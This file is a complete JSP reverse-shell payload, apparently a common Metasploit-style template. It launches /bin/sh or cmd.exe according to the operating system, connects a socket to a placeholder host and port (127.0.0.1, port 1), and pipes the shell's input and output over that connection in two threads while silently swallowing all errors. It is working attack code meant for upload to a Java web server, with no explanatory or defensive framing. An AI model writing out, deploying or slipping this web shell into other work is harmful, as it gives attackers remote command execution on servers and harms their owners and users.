<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream wJ;
    OutputStream wL;

    StreamConnector( InputStream wJ, OutputStream wL )
    {
      this.wJ = wJ;
      this.wL = wL;
    }

    public void run()
    {
      BufferedReader dT  = null;
      BufferedWriter w2j = null;
      try
      {
        dT  = new BufferedReader( new InputStreamReader( this.wJ ) );
        w2j = new BufferedWriter( new OutputStreamWriter( this.wL ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = dT.read( buffer, 0, buffer.length ) ) > 0 )
        {
          w2j.write( buffer, 0, length );
          w2j.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( dT != null )
          dT.close();
        if( w2j != null )
          w2j.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "127.0.0.1", 1 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
